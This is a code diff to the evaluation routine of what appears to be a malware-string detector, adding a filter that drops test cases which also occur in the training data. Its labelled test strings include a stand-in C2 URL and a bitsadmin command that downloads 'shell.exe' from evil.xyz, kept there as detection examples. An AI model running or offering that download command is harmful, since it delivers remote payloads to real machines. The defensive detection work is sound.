@@ -85,7 +85,7 @@ def evaluate():
     eval_cases = [
         # (string, true_label, description)
         ("http://new-c2-server.ru/payload", True, "New C2 domain (unseen TLD .ru)"),
-        ("NtMapViewOfSection", True, "Injection API (unseen from training)"),
+        ("NtMapViewOfSection", True, "Injection API"),
         ("bitsadmin.exe /transfer evil http://evil.xyz/shell.exe C:\\evil.exe", True, "LOLBin download"),
         ("WUB3AlExbRk9G2mP8nQzX6jLk", True, "High entropy obfuscated string"),
         ("GetWindowsDirectoryA", False, "Standard benign API"),
@@ -93,6 +93,9 @@ def evaluate():
         ("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts", False, "Benign registry key"),
         ("Version 1.0.0.0", False, "Common version string"),
     ]
+
+    training_texts = {text for text, _ in load_training_data()}
+    eval_cases = [case for case in eval_cases if case[0] not in training_texts]
 
     print(f"\n{'='*65}")
     print(f"  Model Evaluation on Unseen Strings")
